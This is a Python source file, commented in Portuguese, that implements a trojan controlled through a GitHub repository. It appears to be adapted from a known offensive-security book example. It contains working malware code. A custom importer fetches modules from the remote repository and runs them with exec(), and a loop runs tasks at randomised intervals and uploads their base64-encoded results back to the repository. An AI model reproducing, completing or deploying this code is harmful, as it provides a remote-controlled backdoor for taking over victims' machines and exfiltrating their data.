import base64
import github3
import json
import random
import sys
import threading
import time
from datetime import datetime

# Cache de sessão para evitar múltiplas autenticações e rate limit do GitHub
_SESSION_CACHE = {}

def github_connect():
    if 'repo' in _SESSION_CACHE:
        return _SESSION_CACHE['repo']
    
    try:
        with open("my token.txt", "r") as f:
            token = f.read().strip()
        user = 'tiarno'
        sess = github3.login(token=token)
        repo = sess.repository(user, 'bhptrojan')
        _SESSION_CACHE['repo'] = repo
        return repo
    except Exception as e:
        print(f"Erro de conexão: {e}")
        sys.exit(1)

class Trojan:
    def __init__(self, bot_id):
        self.id = bot_id
        self.config_file = f'{bot_id}.json'
        self.data_path = f'data/{bot_id}/'
        self.repo = github_connect()

    def get_config(self):
        try:
            # Busca o conteúdo do arquivo de config
            content = self.repo.file_contents(f'config/{self.config_file}').content
            return json.loads(base64.b64decode(content))
        except Exception as e:
            print(f"Erro ao buscar config: {e}")
            return None

    def module_runner(self, module_name):
        try:
            # Tenta executar a função run() do módulo carregado
            module = sys.modules.get(module_name)
            if module and hasattr(module, 'run'):
                result = module.run()
                if result:
                    self.store_module_result(result)
        except Exception as e:
            print(f"Erro ao executar módulo {module_name}: {e}")

    def store_module_result(self, data):
        try:
            if not isinstance(data, str):
                data = str(data)
            
            data_encoded = base64.b64encode(data.encode())
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            remote_path = f'{self.data_path}{timestamp}.data'
            
            self.repo.create_file(remote_path, 'Update data', data_encoded)
        except Exception as e:
            print(f"Erro ao salvar dados: {e}")

    def run(self):
        while True:
            config = self.get_config()
            if config and 'tasks' in config:
                for task in config['tasks']:
                    module = task.get('module')
                    if not module: continue
                    
                    # O GitImporter já cuida do import via meta_path, 
                    # basta chamar o módulo.
                    t = threading.Thread(target=self.module_runner, args=(module,))
                    t.daemon = True # Garante que a thread feche se o processo principal morrer
                    t.start()
                    
                    time.sleep(random.randint(1, 10))
            
            # Intervalo dinâmico entre ciclos de verificação
            time.sleep(random.randint(1800, 10800))

class GitImporter:
    def __init__(self):
        self.repo = github_connect()

    def find_module(self, fullname, path=None, requested_module=None):
        # Evita loop infinito de importação
        if fullname in sys.modules:
            return None
        
        try:
            # Tenta baixar o código do repositório
            content = self.repo.file_contents(f'modules/{fullname}.py').content
            code = base64.b64decode(content)
            
            # Cria um módulo vazio e executa o código dentro do dicionário dele
            module = type(sys)(fullname)
            exec(code, module.__dict__)
            sys.modules[fullname] = module
            return module
        except Exception:
            return None

if __name__ == '__main__':
    # Adiciona o importador customizado ao sistema de busca de módulos do Python
    sys.meta_path.append(GitImporter())
    
    bot = Trojan('abc')
    bot.run()
